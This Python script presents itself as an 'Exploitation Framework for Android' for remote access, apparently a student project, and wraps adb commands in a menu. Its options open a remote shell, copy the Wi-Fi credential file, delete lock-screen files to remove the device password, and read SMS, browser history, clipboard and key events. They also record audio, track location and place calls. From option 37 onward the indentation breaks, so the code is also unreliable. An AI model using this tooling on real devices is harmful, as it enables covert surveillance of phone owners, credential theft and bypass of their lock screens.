#!/usr/bin/env python3
#-*- coding: utf-8 -*-

#            ---------------------------------------------------
#                         Giovanni Android Framework                                                  
#            ---------------------------------------------------
#                           johnmadaha6@gmail.com

import os
import sys
import readline
import random
import time as  t
import rlcompleter

def autocomplete(text, state):
    import readline
    # import rlcompleter
    # readline.parse_and_bind("tab:complete")
    line = readline.get_line_buffer()
    splitted = line.lstrip().split(" ")

    # no space, autocomplete will be the basic commands:
    options = [x + " " for x in actions if x.startswith(text)]
    options.extend([x + " " for x in remap if x.startswith(text)])
    try:
        return options[state]
    except:
        return None

def get_input(prompt, auto_complete_fn=None, basefile_fn=None):
    try:
        if auto_complete_fn != None:
            import readline
            readline.set_completer_delims(' \t\n;/')
            readline.parse_and_bind("tab: complete")
            readline.set_completer(auto_complete_fn)
    except Exception as e:
        pass

    cmd = input("%s" % prompt)
    return cmd.strip()

CurrentDir = os.path.dirname(os.path.abspath(__file__))
readline.set_completer(autocomplete)
readline.parse_and_bind("tab: complete")
WHSL = '\033[0m'
ENDL = '\033[0m'
REDL = '\033[0;31m'
# GNSL = '\033[0;32m'
GNSL = WHSL
load_count = 0
page2 = False

arrow = REDL + "└──>" + WHSL
arrow = str(" "+arrow)
connect = REDL + "│" + WHSL

page_1 = '''{2}

  ______                _______                _         _         ___                                                   _     
 / _____)              (_______)              | |       (_) _     / __)                                                 | |    
| /  ___  _   _  ____   _____    _   _  ____  | |  ___   _ | |_  | |__   ____   ____  ____    ____  _ _ _   ___    ____ | |  _ 
| | (___)| | | ||  _ \ |  ___)  ( \ / )|  _ \ | | / _ \ | ||  _) |  __) / ___) / _  ||    \  / _  )| | | | / _ \  / ___)| | / )
| \____/| \ V / | | | || |_____  ) X ( | | | || || |_| || || |__ | |   | |    ( ( | || | | |( (/ / | | | || |_| || |    | |< ( 
 \_____/   \_/  |_| |_||_______)(_/ \_)| ||_/ |_| \___/ |_| \___)|_|   |_|     \_||_||_|_|_| \____) \____| \___/ |_|    |_| \_)
                                       | |        
                                       | |                                   BY John S. Madaha
                                       |_|                                                                                     
                                                
  {0}{1}Exploitation Framework for Android.{0}{2}             {0}{1}HomePage: https://github.com/GiovanniJohnArthur/FinalYearProject{0}{2}
        {0}{1}For Android Remote Access{0}{2} 
                       
                        
 {0}{1}1{0} - {2}Show connected devices       {0}{1}10{0} - {2}Shutdown the device      {0}{1}19{0} - {2} Extract apk from app      {0}{1}28{0} - {2}Call a specific number
 {0}{1}2{0} - {2}Disconnect all devices       {0}{1}11{0} - {2}Uninstall an app         {0}{1}20{0} - {2} Get Battery Status        {0}{1}29{0} - {2}Get a Location
 {0}{1}3{0} - {2}Connect a new device         {0}{1}12{0} - {2}Show device log          {0}{1}21{0} - {2} Get Network Status        {0}{1}30{0} - {2}Get camera to take a photo
 {0}{1}4{0} - {2}Access device shell          {0}{1}13{0} - {2}Dump System Info         {0}{1}22{0} - {2} Turn WiFi on/off          {0}{1}31{0} - {2}Start a keylogger
 {0}{1}5{0} - {2}Install an apk on a device   {0}{1}14{0} - {2}List all device apps     {0}{1}23{0} - {2} Remove device password    {0}{1}32{0} - {2}Record Audio
 {0}{1}6{0} - {2}Screen record a device       {0}{1}15{0} - {2}Run a device app         {0}{1}24{0} - {2} Emulate button presses    {0}{1}33{0} - {2}Get SMS
 {0}{1}7{0} - {2}Get device screenshot        {0}{1}16{0} - {2}Port Forwarding          {0}{1}25{0} - {2} Get Current Activity      {0}{1}34{0} - {2}Get Browser History
 {0}{1}8{0} - {2}Restart gvn Server           {0}{1}17{0} - {2}Grab wpa_supplicant      {0}{1}26{0} - {2} Update gvn Framework      {0}{1}35{0} - {2}Clipboard Hijacking
 {0}{1}9{0} - {2}Pull files from device       {0}{1}18{0} - {2}Show Mac/Inet            {0}{1}27{0} - {2} Exit gvn Framework        {0}{1}36{0} - {2}Toggle Flashlight
 
 {0}{1}37{0} - {2}Interactive ADB Shell       {0}{1}40{0} - {2}Simulate Gestures/Touch  {0}{1}43{0} - {2}Live Log Monitoring       
 {0}{1}38{0} - {2}Manage App Permissions      {0}{1}41{0} - {2}GPS Spoofing             {0}{1}44{0} - {2}Bluetooth Device Interaction 
 {0}{1}39{0} - {2}Screen Mirroring            {0}{1}42{0} - {2}Process Monitoring       {0}{1}45{0} - {2}Kill Processes
'''.format(WHSL, WHSL, WHSL)


page_2 = '''\n
'''.format(GNSL, REDL, WHSL)

def main():
    page_num = 1
    option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        
    while(1):
        
        if option == '1' or option == 'show':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb devices -l")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  ==  '2' or option == 'disconnect':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb disconnect")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '3' or option == 'connect':
            print(("\n{1}[{0}+{1}]{2} Enter a device IP address.").format(REDL, GNSL, WHSL))
            try:
                device_name = input (arrow+" gvn"+GNSL+"("+REDL + "connect" + GNSL + ")"+ENDL + " > ")
            except KeyboardInterrupt:
                main()
            if device_name == '':
                main()
            if device_name == '27' or device_name == 'exit' or device_name == 'quit' or device_name == 'back':
                main()
                
            os.system("adb connect "+device_name+":5555")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  == '4' or option == 'shell':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '5' or option == 'install':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter the apk location.").format(REDL, GNSL, WHSL))
            apk_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "apk-install" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s  "+device_name+" install "+apk_location)
            print(GNSL  +  "Apk has been installed.")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option ==  '6' or option == 'record':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Video recording started.").format(REDL, GNSL, WHSL))
            print(("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/screen.mp4")
            print(("    {1}[{0}+{1}]{2} Enter where you would like to save the video.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "screen-record" + GNSL + ")"+ENDL + " > ")
            
            os.system("adb -s "+device_name+" pull /sdcard/screen.mp4 "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option  == '7' or option == 'screenshot':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter where you would like to save the screenshot.").format(REDL, GNSL, WHSL))
            place_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "screenshot" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '8' or option == 'restart':
            print(("{1}[{0}+{1}]{2} Restarting Giovanni Server...{3}").format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            os.system("adb start-server >> /dev/null")
            t.sleep(4)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '9' or option == 'pull-files':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a file location on a device.").format(REDL, GNSL, WHSL))
            file_location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "file-pull" + GNSL + ")"+ENDL + " > ")
            print(("        "+connect))
            print(("       {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
            place_location = input("       "+arrow + " gvn"+GNSL+"("+REDL + "file-pull" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + "> ")

        elif option == '10' or option == 'shutdown':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+ " reboot ")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option ==  '11' or option == 'uninstall':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " gvn"+GNSL+"("+REDL + "app-delete" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" uninstall "+package_name)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '12' or option == 'logs':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system('adb -s '+device_name+" logcat ")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '13' or option == 'dumpsys':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s "+device_name+" shell dumpsys")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '14' or option == 'list':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell pm list packages -f")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '15' or option == 'run-app':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " gvn"+GNSL+"("+REDL + "app-run" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '16' or option == 'port-forward':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a port on the device.").format(REDL, GNSL, WHSL))
            port_device = input("    "+arrow + " gvn"+GNSL+"("+REDL + "port-forward" + GNSL + ")"+ENDL + " > ")
            print(("         "+connect))
            print(("        {1}[{0}+{1}]{2} Enter a port to forward it too.").format(REDL, GNSL, WHSL))
            forward_port = input("        "+arrow + " gvn"+GNSL+"("+REDL + "port-forward" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '17' or option == 'wpa-grub':
            try:
                print(("     "+connect))
                print(("    {1}[{0}+{1}]{2} Enter where you would like to save the file.").format(REDL, GNSL, WHSL))
                location = input("    "+arrow + " gvn"+GNSL+"("+REDL + "wpa-grub" + GNSL + ")"+ENDL + " > ")

                os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system("adb -s "+device_name+" pull /sdcard/wpa-supplicant.conf "+location)

                option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

            except KeyboardInterrupt:
                try:
                    device_name
                except:
                    print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                    main()
                    
                option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '18' or option == 'ip':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell ip address show wlan0")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '19' or option == 'pull-apk':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} Enter a package name.").format(REDL, GNSL, WHSL))
            package_name = input("    "+arrow + " gvn"+GNSL+"("+REDL + "pull-apk" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" shell pm path "+package_name)
            print(("         "+connect))
            print(("        {1}[{0}+{1}]{2} Enter the path to apk.").format(REDL, GNSL, WHSL))
            path = input("        "+arrow + " gvn"+GNSL+"("+REDL + "pull-apk" + GNSL + ")"+ENDL + " > ")
            print(("             "+connect))
            print(("            {1}[{0}+{1}]{2} Enter The location to store the apk.")  .format(REDL, GNSL, WHSL))
            location =   input("            "+arrow + " gvn"+GNSL+"("+REDL + "pull-apk" + GNSL + ")"+ENDL + " > ")

            os.system("adb -s " +device_name+" pull "+path+" "+location)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '20' or option == 'battery':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys battery")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '21' or option == 'netstat':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell netstat")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '22' or option == 'wifi':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(("    {1}[{0}+{1}]{2} WARNING:To be able to turn WiFi back on, the device should be Pluged-In.").format(REDL, GNSL, WHSL))
            print(("     "+connect))
            on_off = input(GNSL + "    ["+REDL+"+"+GNSL+"]"+WHSL+" Would you like to turn the WiFi on/off (Enter 'on' or 'off'): ")
            if on_off == 'off':
                command = " shell svc wifi disable"
            else:
                command = " shell svc wifi enable"

            os.system("adb -s "+device_name+command)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '23' or option == 'remove-password':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("     "+connect))
            print(REDL + "****************** REMOVING PASSWORD ******************")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'")
            os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
            print(REDL + "****************** REMOVING PASSWORD ******************")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '24'or option == 'keycode':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print('''
            0   -->  KEYCODE_UNKNOWN
            1   -->  KEYCODE_MENU
            2   -->  KEYCODE_SOFT_RIGHT
            3   -->  KEYCODE_HOME
            4   -->  KEYCODE_BACK
            5   -->  KEYCODE_CALL
            6   -->  KEYCODE_ENDCALL
            7   -->  KEYCODE_0
            8   -->  KEYCODE_1
            9   -->  KEYCODE_2
            10  -->  KEYCODE_3
            11  -->  KEYCODE_4
            12  -->  KEYCODE_5
            13  -->  KEYCODE_6
            14  -->  KEYCODE_7
            15  -->  KEYCODE_8
            16  -->  KEYCODE_9
            17  -->  KEYCODE_STAR
            18  -->  KEYCODE_POUND
            19  -->  KEYCODE_DPAD_UP
            20  -->  KEYCODE_DPAD_DOWN
            21  -->  KEYCODE_DPAD_LEFT
            22  -->  KEYCODE_DPAD_RIGHT
            23  -->  KEYCODE_DPAD_CENTER
            24  -->  KEYCODE_VOLUME_UP
            25  -->  KEYCODE_VOLUME_DOWN
            26  -->  KEYCODE_POWER
            27  -->  KEYCODE_CAMERA
            28  -->  KEYCODE_CLEAR
            29  -->  KEYCODE_A
            30  -->  KEYCODE_B
            31  -->  KEYCODE_C
            32  -->  KEYCODE_D
            33  -->  KEYCODE_E
            34  -->  KEYCODE_F
            35  -->  KEYCODE_G
            36  -->  KEYCODE_H
            37  -->  KEYCODE_I
            38  -->  KEYCODE_J
            39  -->  KEYCODE_K
            40  -->  KEYCODE_L
            41  -->  KEYCODE_M
            42  -->  KEYCODE_N
            43  -->  KEYCODE_O
            44  -->  KEYCODE_P
            45  -->  KEYCODE_Q
            46  -->  KEYCODE_R
            47  -->  KEYCODE_S
            48  -->  KEYCODE_T
            49  -->  KEYCODE_U
            50  -->  KEYCODE_V
            51  -->  KEYCODE_W
            52  -->  KEYCODE_X
            53  -->  KEYCODE_Y
            54  -->  KEYCODE_Z
            55  -->  KEYCODE_COMMA
            56  -->  KEYCODE_PERIOD
            57  -->  KEYCODE_ALT_LEFT
            58  -->  KEYCODE_ALT_RIGHT
            59  -->  KEYCODE_SHIFT_LEFT
            60  -->  KEYCODE_SHIFT_RIGHT
            61  -->  KEYCODE_TAB
            62  -->  KEYCODE_SPACE
            63  -->  KEYCODE_SYM
            64  -->  KEYCODE_EXPLORER
            65  -->  KEYCODE_ENVELOPE
            66  -->  KEYCODE_ENTER
            67  -->  KEYCODE_DEL
            68  -->  KEYCODE_GRAVE
            69  -->  KEYCODE_MINUS
            70  -->  KEYCODE_EQUALS
            71  -->  KEYCODE_LEFT_BRACKET
            72  -->  KEYCODE_RIGHT_BRACKET
            73  -->  KEYCODE_BACKSLASH
            74  -->  KEYCODE_SEMICOLON
            75  -->  KEYCODE_APOSTROPHE
            76  -->  KEYCODE_SLASH
            77  -->  KEYCODE_AT
            78  -->  KEYCODE_NUM
            79  -->  KEYCODE_HEADSETHOOK
            80  -->  KEYCODE_FOCUS
            81  -->  KEYCODE_PLUS
            82  -->  KEYCODE_MENU
            83  -->  KEYCODE_NOTIFICATION
            84  -->  KEYCODE_SEARCH
            85  -->  TAG_LAST_KEYCODE
            ''')
            print(("{1}[{0}+{1}]{2} Enter a keycode option number.").format(REDL, GNSL, WHSL))
            num = input(arrow + " gvn"+GNSL+"("+REDL + "keycode" + GNSL + ")"+ENDL + " > ")
            os.system("adb -s "+device_name+" shell input keyevent "+num)
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '25' or option == 'activity':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            os.system("adb -s " +device_name+ " shell dumpsys activity")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '26' or option == 'update':
            os.system("chmod +x etc/update.sh && etc/update.sh")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
        
       # elif option == 'clear':
            #os.system("cadb shell pm clear com.android.browser")
           # option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '':
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")
            
        elif option == '27' or option == 'back' or option == 'exit' or option == 'quit':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("{1}[{0}+{1}]{2} Stopping Giovanni Server...{3}").format(REDL, GNSL, WHSL, ENDL))
            os.system("adb disconnect >> /dev/null")
            os.system("adb kill-server >> /dev/null")
            t.sleep(4)
            exit()
            break

        elif option == '28' or option == 'call':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Enter the phone number to call.").format(REDL, GNSL, WHSL))
            phone_number = input("    " + arrow + " gvn" + GNSL + "(" + REDL + "call" + GNSL + ")" + ENDL + " > ")
            os.system(f"adb -s {device_name} shell am start -a android.intent.action.CALL -d tel:{phone_number}")   
            option = input(ENDL + "gvn" + GNSL + "(" + REDL + "menu" + GNSL + ")" + ENDL + " > ")

        elif option == '29' or option == 'get-location':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Getting GPS location...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell dumpsys location | grep 'lastKnownLocation'")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '30' or option == 'take-photo':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Taking photo...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell am start -a android.media.action.IMAGE_CAPTURE")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '31' or option == 'start-keylogger':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Starting keylogger...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell getevent -l")  # Monitor key events
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '32' or option == 'record-audio':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Recording audio...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell am start -a android.provider.MediaStore.RECORD_SOUND")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '33' or option == 'get-sms':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Get SMS...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell content query --uri content://sms/")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '34' or option == 'get-browser-history':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Get Browser History...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell content query --uri content://browser/bookmarks/ --projection title,url")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '35' or option == 'get-clipboard':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Get Clipboard contents...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell service call clipboard 1")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '36' or option == 'toggle-flashlight':
            try:
                device_name
            except:
                print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
                main()
            print(("    {1}[{0}+{1}]{2} Toggle Flashlight...").format(REDL, GNSL, WHSL))
            os.system(f"adb -s {device_name} shell input keyevent 26")  # Wake up device if needed
            os.system(f"adb -s {device_name} shell am start -a android.media.action.STILL_IMAGE_CAMERA --ez torch true")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

        elif option == '37' or option == 'interactive-adb-shell':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Opening Interactive ADB Shell...").format(REDL, GNSL, WHSL))
    os.system(f"adb -s {device_name} shell")  # Opens an interactive ADB shell

elif option == '38' or option == 'manage-app-permissions':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Managing App Permissions...").format(REDL, GNSL, WHSL))
    package_name = input("Enter the package name: ")
    permission = input("Enter the permission (e.g., android.permission.CAMERA): ")
    action = input("Grant (g) or Revoke (r) permission? ")
    if action == 'g':
        os.system(f"adb -s {device_name} shell pm grant {package_name} {permission}")
    elif action == 'r':
        os.system(f"adb -s {device_name} shell pm revoke {package_name} {permission}")

elif option == '39' or option == 'screen-mirroring':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Starting Screen Mirroring...").format(REDL, GNSL, WHSL))
    os.system(f"scrcpy -s {device_name}")  # Uses scrcpy for screen mirroring

elif option == '40' or option == 'simulate-gestures':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Simulating Gestures...").format(REDL, GNSL, WHSL))
    gesture = input("Enter gesture (swipe/tap): ")
    if gesture == 'swipe':
        x1, y1 = input("Enter starting x and y coordinates: ").split()
        x2, y2 = input("Enter ending x and y coordinates: ").split()
        os.system(f"adb -s {device_name} shell input swipe {x1} {y1} {x2} {y2}")
    elif gesture == 'tap':
        x, y = input("Enter x and y coordinates: ").split()
        os.system(f"adb -s {device_name} shell input tap {x} {y}")

elif option == '41' or option == 'gps-spoofing':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Spoofing GPS Location...").format(REDL, GNSL, WHSL))
    latitude = input("Enter latitude: ")
    longitude = input("Enter longitude: ")
    os.system(f"adb -s {device_name} shell am startservice -a com.example.fakegps.SETLOCATION --ei latitude {latitude} --ei longitude {longitude}")

elif option == '42' or option == 'process-monitoring':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Monitoring Processes...").format(REDL, GNSL, WHSL))
    os.system(f"adb -s {device_name} shell top")  # Shows running processes on the device

elif option == '43' or option == 'live-log-monitoring':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Starting Live Log Monitoring...").format(REDL, GNSL, WHSL))
    os.system(f"adb -s {device_name} logcat")  # Starts live log monitoring with logcat

elif option == '44' or option == 'bluetooth-device-interaction':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Scanning for Bluetooth Devices...").format(REDL, GNSL, WHSL))
    os.system(f"adb -s {device_name} shell am start -a android.bluetooth.devicepicker.action.LAUNCH")  # Opens Bluetooth picker on device

elif option == '45' or option == 'kill-processes':
    try:
        device_name
    except:
        print(("{1}[{0}+{1}]{2} No devices connected yet.").format(REDL, GNSL, WHSL))
        main()
    print(("    {1}[{0}+{1}]{2} Killing Processes...").format(REDL, GNSL, WHSL))
    pid = input("Enter the process ID (PID) to kill: ")
    os.system(f"adb -s {device_name} shell kill {pid}")

            
        else:
            print("gvn: error: invalid input command or out of range entity")
            option = input(ENDL + "gvn"+GNSL+"("+REDL + "menu" + GNSL + ")"+ENDL + " > ")

    main()
    
import os
os.system("printf '\033]2;giovanni framework\a'")
print(("{1}[{0}+{1}]{2} Starting Giovanni Server...").format(REDL, GNSL, WHSL))
os.system("adb tcpip 5555 >> /dev/null")
t.sleep(4)
os.system('clear')
print(page_1)
main()
